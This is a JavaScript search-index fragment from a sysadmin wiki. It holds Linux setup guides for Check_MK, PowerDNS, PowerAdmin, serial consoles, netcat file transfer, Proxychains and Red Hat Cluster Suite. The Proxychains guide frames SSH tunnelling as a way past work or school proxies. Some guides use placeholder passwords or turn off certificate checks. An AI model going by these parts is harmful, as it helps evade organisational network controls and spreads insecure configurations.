/usr/share/pnp4nagios/html/templates RRA config for PNP4Nagios /usr/share/check_mk/pnp-rraconf compile livestatus module yes check_mk's binary modules /usr/lib/check_mk Unix socket for Livestatus /var/log/nagios/rw/live Backends for other systems /usr/share/check_mk/livestatus Proceed with installation (y/n)? y (Compiling MK Livestatus.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................) Installation completed successfully. Please restart Nagios and Apache in order to update/active check_mk's web pages. You can access the new Multisite GUI at http://localhost/check_mkcheck_mk/ Let’s install the agent package:\ndpkg -i check-mk-agent_1.1.12p7-2_all.deb We’ll create the socket directory and set the appropriate permissions:\nmkdir -p /var/lib/nagios3/rw/ touch /var/lib/nagios3/rw/live chown -Rf nagios. /var/lib/nagios3 Xinetd linkConfigure xinetd:\nservice livestatus { type = UNLISTED port = 6557 socket_type = stream protocol = tcp wait = no cps = 100 3 instances = 500 per_source = 250 flags = NODELAY user = nagios server = /usr/bin/unixcat server_args = /var/lib/nagios3/rw/live only_from = 127.0.0.1 # modify this to only allow specific hosts to connect, currenly localhost only disable = no } And restart:\n/etc/init.d/xinetd restart Apache linkFirst, let’s create an htpasswd file that will contain the authorized users. You can later connect it to LDAP or another authentication system:\n\u003e htpasswd -c /etc/nagios/htpasswd.users nagiosadmin New password: Re-type new password: Adding password for user nagiosadmin We’ll grant additional permissions to Apache for the web interface to display properly:\nusermod -G nagios -a www-data mkdir /var/lib/check_mk/web/nagiosadmin chown nagios:www-data /var/lib/check_mk/web/ chmod ug+rwx /var/lib/check_mk/web/ Restart Apache if needed as you may have new modules (like mod_python) that were just installed.\nNagios linkVerify that your Nagios configuration lines look like this (these lines should have been automatically added to the end of your configuration file):\n[...] # Load Livestatus Module event_broker_options=-1 broker_module=/usr/lib/check_mk/livestatus.o /var/lib/nagios3/rw/live [...] Nevertheless, check that the end of the line is correct because we didn’t specify it in the setup.\nFinally, restart Nagios. In your logs (syslog), you should see this:\n[...] Apr 4 11:28:36 nagios nagios3: Nagios 3.2.1 starting... (PID=17414) Apr 4 11:28:36 nagios nagios3: Local time is mer. avril 04 11:28:36 CEST 2012 Apr 4 11:28:36 nagios nagios3: LOG VERSION: 2.0 Apr 4 11:28:36 nagios nagios3: livestatus: Livestatus 1.1.12p7 by Mathias Kettner. Socket: '/var/log/nagios/rw/live' Apr 4 11:28:36 nagios nagios3: livestatus: Please visit us at http://mathias-kettner.de/ Apr 4 11:28:36 nagios nagios3: livestatus: Hint: please try out OMD - the Open Monitoring Distribution Apr 4 11:28:36 nagios nagios3: livestatus: Please visit OMD at http://omdistro.org Apr 4 11:28:36 nagios nagios3: livestatus: Finished initialization. Further log messages go to /var/log/nagios3/livestatus.log Apr 4 11:28:36 nagios nagios3: Event broker module '/usr/lib/check_mk/livestatus.o' initialized successfully. Usage linkUsing it is very simple. Here are a few examples to retrieve information:\necho 'GET services' | unixcat /var/lib/nagios3/rw/live echo 'GET hosts' | unixcat /var/lib/nagios3/rw/live For more information: http://mathias-kettner.de/checkmk_livestatus.html\nAnd you can use the web interface here: http://nagios/check_mkcheck_mk\nResources linkhttp://syslog.tv/2011/10/13/nagios3-mk-livestatus-xinetd/\n"
            }
        );
    index.add(
            {
                id:  329 ,
                href: "\/PowerAdmin_:_Une_interface_d\u0027administration_pour_PowerDNS\/",
                title: "PowerAdmin: An Administration Interface for PowerDNS",
                description: "How to install and configure PowerAdmin, a PHP interface for managing PowerDNS",
                content: " Software version 2.1.6 Operating System Debian 6 Website PowerAdmin Website Last Update 15/05/2012 Introduction linkPowerAdmin is an administration interface for PowerDNS. It’s built with PHP and allows you to manage much more than the basic functionality of PowerDNS.\nIt’s very useful if you have a MySQL backend which is not very practical for adding records/zones or modifying the PowerDNS configuration.\nInstallation linkWe’ll need a MySQL server, Apache and PHP:\naptitude install apache2 php5 php5-mysql libapache2-mod-php5 php5-mcrypt mysql-server Then we’ll get the latest version of PowerAdmin:\ncd /var/www wget --no-check-certificate -O poweradmin.tgz \"https://github.com/poweradmin/poweradmin/tarball/v2.1.6\" tar -xzf poweradmin.tgz mv poweradmin-poweradmin-* poweradmin rm -f poweradmin.tgz chown -Rf www-data. poweradmin Configuration linkUse the wizard by pointing to your server: http:///poweradmin/install/\nDuring the installation, it will generate a configuration that you’ll need to copy to the right location (/var/www/poweradmin/inc/config.inc.php):\n\u003c?php $db_host = '127.0.0.1'; $db_user = 'pdns'; $db_pass = 'password'; $db_name = 'pdns'; $db_port = '3306'; $db_type = 'mysql'; $db_layer = 'PDO'; $session_key = '=^EfdfdfdsfsdfezzezcdfdsfezeJ_'; $iface_lang = 'en_EN'; $dns_hostmaster = 'deimos.deimos.fr'; $dns_ns1 = 'dns1.deimos.fr'; $dns_ns2 = 'dns2.deimos.fr'; ?\u003e Then we’ll remove the installation directory once completed:\nrm -Rf /var/www/poweradmin/install Make sure you have the correct MySQL permissions:\nGRANT SELECT, INSERT, UPDATE, DELETE ON `pdns`.* TO 'pdns'@'localhost'; Log in to the interface:\nURL: http:///poweradmin/ Login: admin Password: password (the one you entered in the installer) "
            }
        );
    index.add(
            {
                id:  330 ,
                href: "\/PowerDNS:_Cr%C3%A9er_un_serveur_de_cache_DNS\/",
                title: "PowerDNS: Creating a DNS Cache Server",
                description: "How to install and configure PowerDNS as a caching DNS server on Debian 6",
                content: " Software version 2.9.22 Operating System Debian 6 Website PowerDNS Website Last Update 15/05/2012 Introduction linkPowerDNS is (as its name suggests) a DNS server. It’s a direct competitor to Bind. It aims to be less RAM-intensive and offers more flexible configuration options than Bind.\nPowerDNS is divided into several roles:\nMaster Cache Here we will cover the cache aspect. If you want to set up a PowerDNS master server, I invite you to follow this link.\nInstallation linkTo install PowerDNS:\naptitude install pdns-recursor Configuration linkOnce installed, the cache server is functional for the local server. All you need to do is configure the listening address to enable it for the rest of your network:\n[...] ################################# # allow-from If set, only allow these comma separated netmasks to recurse # allow-from= [...] ################################# # local-address IP addresses to listen on, separated by spaces or commas. Also accepts ports. # local-address=0.0.0.0 And restart the service to activate it:\n/etc/init.d/pdns-recursor restart Now all you need to do is point your machines to this new server :-)\nReferences linkhttp://www.adminsehow.com/2009/05/how-to-install-a-caching-only-dns-server-using-powerdns-on-debian-lenny/\n"
            }
        );
    index.add(
            {
                id:  331 ,
                href: "\/PowerDNS_:_Cr%C3%A9er_serveur_DNS_maitre\/",
                title: "PowerDNS: Creating a Master DNS Server",
                description: "How to install and configure a PowerDNS master server using a MySQL backend on Debian",
                content: " Software version 2.9.22 Operating System Debian 6 Website PowerDNS Website Last Update 15/05/2012 Introduction linkPowerDNS is (as its name suggests) a DNS server. It’s a direct competitor to Bind. It aims to be less memory-intensive and offers more flexible configuration options than Bind.\nPowerDNS is divided into several roles:\nMaster Cache In this guide, we’ll cover the master server configuration. If you wish to set up a PowerDNS cache server, please follow this link.\nInstallation linkFirst, we’ll install a MySQL database (unless you already have another database you wish to use as a backend):\naptitude install mysql-server Then we’ll install PowerDNS:\naptitude install pdns-server pdns-backend-mysql Configuration linkMySQL linkFirst, let’s create the database:\nmysqladmin -uroot -p create pdns Then we’ll create the tables, indexes and assign the permissions:\nmysql -uroot -p pdns \u003c /usr/share/doc/pdns-backend-mysql/mysql.sql PowerDNS linkNow let’s configure PowerDNS. We’ll specify that we’re going to use a MySQL backend:\n[...] ################################# # launch Which backends to launch and order to query them in # launch=gmysql [...] Then we’ll provide the previously configured information:\n# Here come the local changes the user made, like configuration of # the several backends that exist. # MySQL Configuration gmysql-host=127.0.0.1 gmysql-user=pdns gmysql-password=password gmysql-dbname=pdns Now restart PowerDNS:\n/etc/init.d/pdns restart You can now configure your DNS zones and records. I strongly recommend using a web interface to help you with this. For example, you can use PowerAdmin.\nReferences linkhttp://www.debiantutorials.com/installing-powerdns-as-supermaster-with-slaves/\n"
            }
        );
    index.add(
            {
                id:  332 ,
                href: "\/Activer_le_port_s%C3%A9rie_sur_Linux\/",
                title: "Activating the Serial Port on Linux",
                description: "Learn how to configure and activate the serial port on Linux systems for remote access and management.",
                content: "Introduction linkIt’s often convenient to access a machine via the serial port. Unfortunately, we usually realize this too late. Here’s how to activate it.\nFor usage information, please refer to the documentation on Minicom.\nConfiguration linkDebian linkModify the following lines to ensure that the console part loads correctly during the Grub boot:\n# If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=`lsb_release -i -s 2\u003e /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\" GRUB_CMDLINE_LINUX=\"console=tty0 console=ttyS0,9600n8\" # Uncomment to enable BadRAM filtering, modify to suit your needs # This works with Linux (no patch required) and with any kernel that obtains # the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...) #GRUB_BADRAM=\"0x01234567,0xfefefefe,0x89abcdef,0xefefefef\" # Uncomment to disable graphical terminal (grub-pc only) GRUB_TERMINAL=console GRUB_SERIAL_COMMAND=\"serial --speed=9600 --unit=0 --word=8 --parity=no --stop=1\" # The resolution used on graphical terminal # note that you can use only modes which your graphic card supports via VBE # you can see them in real GRUB with the command `vbeinfo' #GRUB_GFXMODE=640x480 # Uncomment if you don't want GRUB to pass \"root=UUID=xxx\" parameter to Linux #GRUB_DISABLE_LINUX_UUID=true # Uncomment to disable generation of recovery mode menu entries #GRUB_DISABLE_LINUX_RECOVERY=\"true\" # Uncomment to get a beep at grub start #GRUB_INIT_TUNE=\"480 440 1\" Then update Grub:\nupdate-grub Uncomment the following line (/etc/inittab):\n[...] # Example how to put a getty on a serial line (for a terminal) # T0:23:respawn:/sbin/getty -L ttyS0 9600 vt100 #T1:23:respawn:/sbin/getty -L ttyS1 9600 vt100 [...] Verify that ttyS0 is also present (/etc/securetty):\n[...] # UART serial ports ttyS0 [...] Reboot your machine! Your system will then be accessible via the serial port.\nReferences link https://www.cyberciti.biz/faq/howto-setup-serial-console-on-debian-linux/ https://codepoets.co.uk/2011/getting-a-kvm-serial-console-with-grub2/ "
            }
        );
    index.add(
            {
                id:  333 ,
                href: "\/Netcat_:_Transfert_de_fichiers\/",
                title: "Netcat: File Transfer",
                description: "A guide on how to use Netcat for file transfers between systems, including HTTP sharing options.",
                content: "Introduction linkNetcat (nc) is a “…simple Unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable back-end tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.”\nAction linkBasically it’s another small, cool Unix tool that allows you to do tons of cool stuff. I found this example out there that lets you transfer files via tar from one box to another. As with anything to do with nc, it’s dead simple, and logical. On the target box, start nc to listen on a port, and tar up anything it ‘hears’ like this:\nnc -l | tar -xf - Then, on the source system, have tar pipe out to netcat, that is pointed to the target host/ip:\ntar -cf - | nc Damn, how cool. There’s plenty more info out there, and the more you look the more you’ll realize what you can do with nc. Tons of great info at the above Wikipedia link, and I also found a great overview at Vulwatch.org. Have fun!\nSharing file through http 80 port link nc -w 5 -v -l 80 \u003c file.ext From the other machine open a web navigator and go to ip from the machine who launch netcat, http://ip-address/\nIf you have some web server listening at 80 port then you would need stop them or select another port before launch net cat ;-)\nResources linkNetcat: Creating a listening port\nNetcat: Remote partition backup\nNetcat Documentation\n"
            }
        );
    index.add(
            {
                id:  334 ,
                href: "\/Proxychains_:_proxyfier_n%27importe_quelle_connexion_vers_l%27ext%C3%A9rieur\/",
                title: "Proxychains: Proxy Any Outbound Connection",
                description: "Guide to setup and use Proxychains to route any application's traffic through a proxy without modifying the application itself.",
                content: "Introduction linkAh, those proxy servers at work or school! They can be quite troublesome! Sometimes you really need temporary access to the outside world. Depending on the commands you use, you may or may not have the ability to configure proxy usage by modifying a configuration file, an environment variable, etc.\nThe benefit of proxychains is that configuration is done only once, in its own configuration file. Then you use the syntax proxychains and your command will use the proxy specified in the proxychains configuration file!\nInstallation linkDebian link aptitude install proxychains Mac OS X linkOn Mac OS X, it’s not yet available in MacPorts, so we’ll need to patch the source to make it work on Mac. Copy this diff to your machine:\ndiff -ruN proxychains-3.1/proxychains/Makefile.in proxychains-3.1_resolv/proxychains/Makefile.in --- proxychains-3.1/proxychains/Makefile.in\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/Makefile.in\t2011-06-16 13:17:20.000000000 -0500 @@ -121,7 +121,7 @@ LIBS = @LIBS@ libproxychains_la_DEPENDENCIES = libproxychains_la_OBJECTS = libproxychains.lo core.lo -CFLAGS = @CFLAGS@ +CFLAGS = @CFLAGS@ -arch x86_64 -arch i386 COMPILE = $(CC) $(DEFS) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(AM_CFLAGS) $(CFLAGS) LTCOMPILE = $(LIBTOOL) --mode=compile $(CC) $(DEFS) $(INCLUDES) $(AM_CPPFLAGS) $(CPPFLAGS) $(AM_CFLAGS) $(CFLAGS) CCLD = $(CC) diff -ruN proxychains-3.1/proxychains/core.c proxychains-3.1_resolv/proxychains/core.c --- proxychains-3.1/proxychains/core.c\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/core.c\t2011-06-16 13:17:19.000000000 -0500 @@ -35,12 +35,18 @@ #include #include #include +#include #include \"core.h\" extern int tcp_read_time_out; extern int tcp_connect_time_out; extern int proxychains_quiet_mode; - +extern connect_t true_connect; +extern getaddrinfo_t true_getaddrinfo; +extern freeaddrinfo_t true_freeaddrinfo; +extern getnameinfo_t true_getnameinfo; +extern gethostbyaddr_t true_gethostbyaddr; + static const char base64[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; static void encode_base_64(char* src,char* dest,int max_len) @@ -159,13 +165,14 @@ pfd[0].fd=sock; pfd[0].events=POLLOUT; -\tfcntl(sock, F_SETFL, O_NONBLOCK); +\tfcntl(sock, F_SETFL, O_NONBLOCK); ret=true_connect(sock, addr, len); -//\tprintf(\"\\nconnect ret=%d\\n\",ret);fflush(stdout); +//\tprintf(\"\\nconnect ret=%d\\n\",ret); fflush(stdout); + if(ret==-1 \u0026\u0026 errno==EINPROGRESS) { ret=poll(pfd,1,tcp_connect_time_out); -// printf(\"\\npoll ret=%d\\n\",ret);fflush(stdout); +//\tprintf(\"\\npoll ret=%d\\n\",ret);fflush(stdout); if(ret==1) { value_len=sizeof(int); @@ -388,14 +395,18 @@ inet_ntoa(*(struct in_addr*)\u0026pd-\u003eip), htons(pd-\u003eport)); pd-\u003eps=PLAY_STATE; + bzero(\u0026addr,sizeof(addr)); + addr.sin_family = AF_INET; addr.sin_addr.s_addr = pd-\u003eip; addr.sin_port = pd-\u003eport; + if (timed_connect (*fd ,(struct sockaddr*)\u0026addr,sizeof(addr))) { pd-\u003eps=DOWN_STATE; goto error1; } + pd-\u003eps=BUSY_STATE; return SUCCESS; error1: @@ -641,7 +652,7 @@ dup2(pipe_fd[1],1); //dup2(pipe_fd[1],2); //\tputenv(\"LD_PRELOAD=\"); -\texeclp(\"proxyresolv\",\"proxyresolv\",name,NULL); +\texeclp(\"./proxyresolv\",\"proxyresolv\",name,NULL); perror(\"can't exec proxyresolv\"); exit(2); diff -ruN proxychains-3.1/proxychains/core.h proxychains-3.1_resolv/proxychains/core.h --- proxychains-3.1/proxychains/core.h\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/core.h\t2011-06-16 13:17:19.000000000 -0500 @@ -66,29 +66,28 @@ int proxychains_write_log(char *str,...); struct hostent* proxy_gethostbyname(const char *name); +typedef struct hostent* (*gethostbyname_t)(const char *); +static gethostbyname_t true_gethostbyname; typedef int (*connect_t)(int, const struct sockaddr *, socklen_t); -connect_t true_connect; - -typedef struct hostent* (*gethostbyname_t)(const char *); -gethostbyname_t true_gethostbyname; +// connect_t true_connect; typedef int (*getaddrinfo_t)(const char *, const char *, const struct addrinfo *, struct addrinfo **); -getaddrinfo_t true_getaddrinfo; +// getaddrinfo_t true_getaddrinfo; typedef int (*freeaddrinfo_t)(struct addrinfo *); -freeaddrinfo_t true_freeaddrinfo; +// freeaddrinfo_t true_freeaddrinfo; typedef int (*getnameinfo_t) (const struct sockaddr *, socklen_t, char *, socklen_t, char *, socklen_t, unsigned int); -getnameinfo_t true_getnameinfo; +// getnameinfo_t true_getnameinfo; typedef struct hostent *(*gethostbyaddr_t) (const void *, socklen_t, int); -gethostbyaddr_t true_gethostbyaddr; +// gethostbyaddr_t true_gethostbyaddr; int proxy_getaddrinfo(const char *node, const char *service, const struct addrinfo *hints, diff -ruN proxychains-3.1/proxychains/libproxychains.c proxychains-3.1_resolv/proxychains/libproxychains.c --- proxychains-3.1/proxychains/libproxychains.c\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/libproxychains.c\t2011-06-16 13:17:19.000000000 -0500 @@ -32,7 +32,6 @@ #include #include - #include \"core.h\" #define satosin(x) ((struct sockaddr_in *) \u0026(x)) @@ -57,6 +56,13 @@ unsigned int *proxy_count, chain_type *ct); +connect_t true_connect; +getaddrinfo_t true_getaddrinfo; +freeaddrinfo_t true_freeaddrinfo; +getnameinfo_t true_getnameinfo; +gethostbyaddr_t true_gethostbyaddr; + + static void init_lib() { //\tproxychains_write_log(\"ProxyChains-\"VERSION @@ -291,7 +297,7 @@ int getnameinfo (const struct sockaddr * sa, socklen_t salen, char * host, socklen_t hostlen, char * serv, -\tsocklen_t servlen, unsigned int flags) +\tsocklen_t servlen, int flags) { int ret = 0; if(!init_l) diff -ruN proxychains-3.1/proxychains/proxychains proxychains-3.1_resolv/proxychains/proxychains --- proxychains-3.1/proxychains/proxychains\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/proxychains\t2011-06-16 13:17:20.000000000 -0500 @@ -1,9 +1,11 @@ #!/bin/sh echo \"ProxyChains-3.1 (http://proxychains.sf.net)\" +echo \"Mod for OSX - using dylib\" if [ $# = 0 ] ; then echo \"\tusage:\" echo \"\tproxychains [args]\" exit fi -export LD_PRELOAD=libproxychains.so +export DYLD_FORCE_FLAT_NAMESPACE= +export DYLD_INSERT_LIBRARIES=./.libs/libproxychains.3.0.0.dylib exec \"$@\" diff -ruN proxychains-3.1/proxychains/proxyresolv proxychains-3.1_resolv/proxychains/proxyresolv --- proxychains-3.1/proxychains/proxyresolv\t2006-03-15 10:16:59.000000000 -0600 +++ proxychains-3.1_resolv/proxychains/proxyresolv\t2011-06-16 13:18:51.000000000 -0500 @@ -11,6 +11,6 @@ exit fi - -export LD_PRELOAD=libproxychains.so -dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;}' +export DYLD_FORCE_FLAT_NAMESPACE= +export DYLD_INSERT_LIBRARIES=./.libs/libproxychains.3.0.0.dylib +dig $1 @$DNS_SERVER +tcp | awk '/^[^;].+A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;}' Now let’s compile it:\nwget -O proxychains-3.1.tar.gz \"http://prdownloads.sourceforge.net/proxychains/proxychains-3.1.tar.gz?download\" tar -xzf proxychains-3.1.tar.gz patch -p0 \u003c proxychains-3.1_osx.diff cd proxychains-3.1 ./configure make cd proxychains sudo cp proxychains proxyresolv /usr/sbin/ Configuration linkYou can use your personal configuration file in ‘~/proxychains/proxychains.conf’ or the one for the entire machine in ‘/etc/proxychains’:\nstrict_chain # Quiet mode (no output from library) quiet_mode # Proxy DNS requests - no leak for DNS data #proxy_dns # Some timeouts in milliseconds tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 12345 Use the port for the SOCKS proxy that we’ll open next via SSH.\nUsage linkTo get an application that doesn’t have SOCKS proxy options to access the outside world using TCP protocol, you first need to set up a SOCKS proxy using SSH:\nTo establish an SSH connection that opens a SOCKS proxy, run this from server A:\nssh -D @ For example:\nssh -D 12345 user@serverB Then, to route an application’s traffic through this proxy, use the proxychains command:\nproxychains my_application Resources linkhttp://proxychains.sourceforge.net/\nhttp://lesdatabases.blogspot.com/2011/06/proxychains-ou-l-de-proxifier.html\nhttp://chrootlabs.org/bgt/proxychains_osx.html\n"
            }
        );
    index.add(
            {
                id:  335 ,
                href: "\/Installation_et_Configuration_de_Red_Hat_Cluster_Suite\/",
                title: "Installation and Configuration of Red Hat Cluster Suite",
                description: "How to install and configure Red Hat Cluster Suite to create a high availability infrastructure with failover capabilities.",
                content: " Software version 5/6 Operating System RHEL 5/6 Website Red Hat Website Last Update 14/05/2012 Introduction linkRed Hat offers a cluster based on Open Source solutions. This document explains how to set one up.\nHere is the type of infrastructure you should have in place to install and configure a cluster:\nRed Hat cluster suite works with a maximum of 16 nodes in a cluster.\nHere is the list of services we will cover with their descriptions:\nService Description ccsd Cluster configuration service aisexec Low-level framework for cluster management (OpenAIS) for Red Hat 5 corosync Low-level framework for cluster management (Corosync) for Red Hat 6 cman Cluster manager fenced Fencing service that enables remote machine reboot DLM Lock system clvmd Cluster version of LVM rgmanager Resources Groups Manager GFS2 Cluster filesystem ricci Remote cluster management service lucci Web frontend connecting to ricci for remote cluster management On Red Hat 5 and Red Hat 6, as you can see, different frameworks are used, but this is transparent to us.\nPrerequisites link You need dedicated interfaces for the cluster. The switches must be capable of multicasting on private interfaces. Use bonding on your network cards. Add as much redundancy as possible. ACPI linkFirst, turn off ACPI to avoid problems:\nchkconfig acpid off service acpid stop Or in grub, add the acpi parameter set to off:\ntitle Red Hat Enterprise Linux (2.6.32-220.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-220.el6.x86_64 ro root=/dev/mapper/myvg-rootvol rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_NO_MD quiet SYSFONT=latarcyrheb-sun16 rhgb crashkernel=auto rd_LVM_LV=myvg/rootvol rd_NO_DM acpi=off initrd /initramfs-2.6.32-220.el6.x86_64.img Choose the method that seems simplest to you.\nHostname linkIt is mandatory that the hostname is correctly configured on all nodes:\n\u003e hostname node1.deimos.fr If not, modify the line in the following file:\nHOSTNAME=node1.deimos.fr Similarly, check that all nodes are reachable by their DNS, or list them in the hosts file:\n127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 # Private interfaces 10.102.2.72 node1 10.102.2.73 node2 10.102.2.74 node3 # Public interfaces 192.168.0.1 server1 192.168.0.2 server2 192.168.0.3 server3 The private interfaces (node1, node2 and node3) will be used for the heartbeat part and therefore dedicated to the cluster. Public interfaces should be used for the rest (direct connections, VIP…). So when configuring your cluster, use the private interfaces for its creation.\nBonding linkIMPORTANT: The bonding of private interfaces (cluster heartbeat) can only be configured in mode 1! Only this mode is accepted.\nIf you are on RHEL 6, create the following line in /etc/modprobe.d/bonding.conf:\nalias bond0 bonding If you are on RHEL \u003c6, you’ll need to insert the same content in the /etc/modprobes.conf file.\nIn /etc/sysconfig/network-script/, create the file ifcfg-bond0 to set up the bonding configuration:\nDEVICE=bond0 IPADDR=192.168.0.104 NETMASK=255.255.255.0 GATEWAY=192.168.0.1 ONBOOT=yes BOOTPROTO=static BONDING_OPTS=\"mode 1\" Then we’ll configure our network interfaces to tell them they will be used for bonding:\nDEVICE=eth0 MASTER=bond0 ONBOOT=yes SLAVE=yes BOOTPROTO=static Do the same for interface 1:\nDEVICE=eth1 MASTER=bond0 ONBOOT=yes SLAVE=yes BOOTPROTO=static Multipathing linkGenerally, you will use a disk array so that data can be accessed from any machine. For this, you will need to use multipathing. Follow this documentation to set it up.\nFirewall linkIf you use a firewall for the interconnection part of your nodes, here is the list of ports:\nService name Port/Protocol cman 5404/udp, 5405/udp ricci 11111/tcp gnbd 14567/tcp modclusterd 16851/tcp dlm 21064/tcp ccsd 50006/tcp, 50007/udp, 50008/tcp, 50009/tcp Note: It is strongly advised against having a software firewall on this part and strongly recommended to have a dedicated switch!\nInstallation linkCluster linkOn all your nodes, install cman and all your dependencies will be installed at once:\nyum install cman ricci openais cman ccs rgmanager lvm2-cluster gfs2-utils Only install what you need of course, you may not need gfs for example.\nThen, set a password for ricci so we can connect to it later:\npasswd ricci Then we’re going to make the services necessary for the proper functioning of the cluster persistent:\nchkconfig cman on chkconfig ricci on chkconfig clvmd on chkconfig gfs2 on chkconfig rgmanager on service cman start service ricci start service clvmd start service gfs2 start service rgmanager start Luci linkOn the client side, preferably use a dedicated machine, you will need to install luci:\nyum install luci chkconfig luci on The idea is to install this interface on a remote machine for the administration of our cluster.\nClvmd linkClvmd is the service that allows you to have LVM in a cluster and thus to have identical volume names on all your nodes.\nA quorum must absolutely be present if we want Clvm. To activate cluster LVM, here is the command to run on all nodes:\nlvmconf --enable-cluster Otherwise, edit the lvm configuration file to modify this line:\n... #locking_type = 1 locking_type = 3 ... You may need to look at the “preferred_names” parameter if you’re using multipathing. Be careful with WWNs, if you use them, you must configure this correctly:\n... # If several entries in the scanned directories correspond to the # same block device and the tools need to display a name for device, # all the pathnames are matched against each item in the following # list of regular expressions in turn and the first match is used. # preferred_names = [ ] # Try to avoid using undescriptive /dev/dm-N names, if present. preferred_names = [ \"^/dev/mpath/\", \"^/dev/mapper/mpath\", \"^/dev/[hs]d\" ] ... Then restart and make the service persistent:\nchkconfig clvmd o service clvmd restart Then you can create LVM volumes as usual. If you are not very familiar with LVM, check this documentation.\nYou can check the status this way:\n\u003e service clvmd status clvmd (pid 16802) is running... Clustered Volume Groups: (none) Active clustered Logical Volumes: (none) Let’s quickly create a volume on a node and you can check that it appears everywhere. In this example, multipath is not used. So we’re going to create a partition and give it an LVM tag. On all nodes, refresh the partition table on the disk where the new partition was created:\npartprobe /dev/sdb Once done, check on all your nodes:\n\u003e fdisk -cul /dev/sdb Périphérique Amorce Début Fin Blocs Id Système /dev/sdb1 2048 8386181 4192067 8e Linux LVM Now we’re going to create the volume:\n\u003e pvcreate /dev/sdb1 Writing physical volume data to disk \"/dev/sdb1\" Physical volume \"/dev/sdb1\" successfully created \u003e vgcreate shared_vg /dev/sdb1 Clustered volume group \"shared_vg\" successfully created \u003e lvcreate -n shared_lv1 -L 256M shared_vg \u003e mkfs.ext4 /dev/shared_vg/shared_lv1 Our volume is now available on all nodes. Caution: this does not mean you will be able to write to it simultaneously. To do this kind of operation, you will need to use GFS2.\nGFS2 linkIf you need to have a filesystem shared across all nodes, you will need to install and use GFS2.\nConfiguration linkQuorum linkThe Quorum is an important element in the design of a High Availability cluster. It is mandatory on a single-node cluster and optional beyond. It must be an element common to the nodes (a partition of a disk array for example) and it is used to place locks to guarantee the general proper state of the cluster.\nTo avoid split brain situations, the weight must be at least half of the nodes + 1.\n(expected_votes / 2) + 1\nBy default 1 node has a weight of 1. The “Expected votes” is the number of weights needed for the cluster to function normally. We will play with this kind of thing when there are application dependencies on other applications not on the same machines. To avoid problems, we will increase the weight of the nodes on the machines.\nExpected votes linkTo see the number of votes required for the cluster to function properly:\n\u003e cman_tool status | grep Expected Expected votes: 2 To change the expected votes value for a maintenance operation for example:\ncman_tool -e 2 To see the weight on each node:\nccs_tool lsnode To modify the weight on a given node:\ncman_tool votes -v Qdisk linkThe Quorum disk (qdisk) is only necessary on a 2-node cluster. Beyond that, it’s not necessary and is not recommended! Qdisk is used by cman and ccsd and must be a partition/LUN, and in no case a logical volume.\nConfiguration linkFor a good configuration, I invite you to look at these links:\nhttp://magazine.redhat.com/2007/12/19/enhancing-cluster-quorum-with-qdisk/ https://access.redhat.com/knowledge/node/2881 You need to properly configure the heartbeat, heuristics and configure the quorum with the right options.\nCreating the qdisk linkTo create the quorum, you must have a single partition that is visible on all nodes:\n\u003e mkqdisk -c /dev/sda2 -l label mkqdisk v0.6.0 Writing new quorum disk label 'qdisk' to /dev/sda2. WARNING: About to destroy all data on /dev/sda2; proceed [N/y]? y Initializing status block for node 1... Initializing status block for node 2... Initializing status block for node 3... Initializing status block for node 4... Initializing status block for node 5... Initializing status block for node 6... Initializing status block for node 7... Initializing status block for node 8... Initializing status block for node 9... Initializing status block for node 10... Initializing status block for node 11... Initializing status block for node 12... Initializing status block for node 13... Initializing status block for node 14... Initializing status block for node 15... Initializing status block for node 16... -c: the partition corresponding to the quorum -l: the label created during fdisk To list active quorums:\n\u003e mkqdisk -L mkqdisk v0.6.0 /dev/disk/by-id/scsi-S_beaf11-part2: /dev/disk/by-path/ip-172.17.101.254:3260-iscsi-iqn.2009-10.com.example.cluster1:iscsi-lun-1-part2: /dev/sda2: Magic: eb7a62c2 Label: qdisk Created: Wed Feb 29 16:27:13 2012 Host: node1.deimos.fr Kernel Sector Size: 512 Recorded Sector Size: 512 We’re going to start the service and make it persistent:\nchkconfig qdiskd on service qdiskd start Then you’ll need to restart the cluster for the quorum to be taken into account.\ncman linkWe can configure CMAN when we have a 2-node cluster so that it does not use the quorum:\nSo there will be a race to the fencing, to see who will reboot the other one first. All this to avoid splitbrains.\nFencing linkFencing is mandatory, because a problematic node can corrupt data on mounted partitions. It is therefore preferable that the other nodes fence (yes, that’s the verb ;)) the node that may cause problems. For this there will be a fenced daemon managed by cman. The fenced agents are stored in /sbin/fence_*.\nWe can test our fencing configuration:\nfence_node node2.deimos.fr It therefore reads the configuration with ccs and uses the right agent to fence the node in question.\nThere are 2 fencing methods:\nSTONITH (Shoot The Other Node In The Head): to do the equivalent of a power cut Fabric: at the level of a switch or equipment like a disk array Stonith linkHere’s an example with an HP ILO, to fence a machine:\n/sbin/fence_ilo -a -l -p -v -o reboot Fabric linkFor SCSI, there is a “scsi_reserve” service that allows to generate a unique key and create records for each machine. Any node can therefore delete the registration that has been made to prevent a problematic machine from continuing to write to SCSI devices.\nWe can see if it is possible to do it or not (here no because I use iscsi which does not support it):\nfence_scsi_test -c 